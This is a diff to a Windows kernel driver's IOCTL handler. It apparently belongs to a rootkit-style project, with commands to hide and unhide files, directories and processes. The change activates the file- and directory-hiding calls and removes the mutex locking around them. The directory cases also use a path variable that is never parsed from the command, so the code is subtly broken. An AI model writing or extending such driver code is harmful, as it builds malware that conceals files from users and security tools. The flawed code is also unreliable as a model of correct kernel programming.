@@ -65,26 +65,18 @@ NTSTATUS ioctl::HandleIoctl(PDEVICE_OBJECT device_object, PIRP irp)
 	case IOCTL_CMD_CLASS::kHideFile:
 		str = cmd->ParseHideFile().file_path.Data();
 		DebugMessage("Hide file: %wZ", str.Data());
-		hide_file::kFileMutex.Lock();
-		//hide_file::AddFileToHideList(str);
-		hide_file::kFileMutex.Unlock();
+		hide_file::AddFileToHideList(str);
 		break;
 	case IOCTL_CMD_CLASS::kHideDir:
-		hide_file::kDirMutex.Lock();
-
-		hide_file::kDirMutex.Unlock();
+		hide_file::AddDirToHideList(str);
 		break;
 	case IOCTL_CMD_CLASS::kUnhideFile:
 		str = cmd->ParseHideFile().file_path.Data();
 		DebugMessage("Unhide file: %wZ", str.Data());
-		hide_file::kFileMutex.Lock();
-		//hide_file::DeleteFileFromHideList(str);
-		hide_file::kFileMutex.Unlock();
+		hide_file::DeleteFileFromHideList(str);
 		break;
 	case IOCTL_CMD_CLASS::kUnhideDir:
-		hide_file::kDirMutex.Lock();
-
-		hide_file::kDirMutex.Unlock();
+		hide_file::DeleteDirFromHideList(str);
 		break;
 	case IOCTL_CMD_CLASS::kHideProc:
 		break;
